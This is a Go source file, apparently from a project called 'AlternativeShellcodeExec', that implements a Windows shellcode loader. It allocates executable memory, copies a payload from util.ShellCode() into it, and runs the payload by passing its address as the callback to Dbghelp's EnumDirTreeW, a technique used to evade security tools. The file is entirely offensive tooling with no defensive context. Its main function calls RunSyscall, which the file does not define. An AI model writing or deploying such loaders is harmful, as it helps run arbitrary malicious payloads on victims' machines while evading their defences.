package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"golang.org/x/sys/windows"
	"unsafe"
)

func Run(op []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")

	dbghelp := windows.NewLazySystemDLL("Dbghelp.dll")
	enumDirTree := dbghelp.NewProc("EnumDirTreeW")
	symInitialize := dbghelp.NewProc("SymInitialize")
	getCurrentProcess := kernel32.NewProc("GetCurrentProcess")

	address, _, _ := virtualAlloc.Call(0, uintptr(len(op)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if address == 0 {
		panic("VirtualAlloc failed")
	}

	copy((*[1 << 30]byte)(unsafe.Pointer(address))[:], op)

	process, _, _ := getCurrentProcess.Call()
	symInitialize.Call(process, 0, 1)

	dummy := make([]uint16, 522)
	enumDirTree.Call(process, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(`C:\Windows`))), uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("*.log"))), uintptr(unsafe.Pointer(&dummy[0])), address, 0)
}

func main() {
	RunSyscall(util.ShellCode())
}
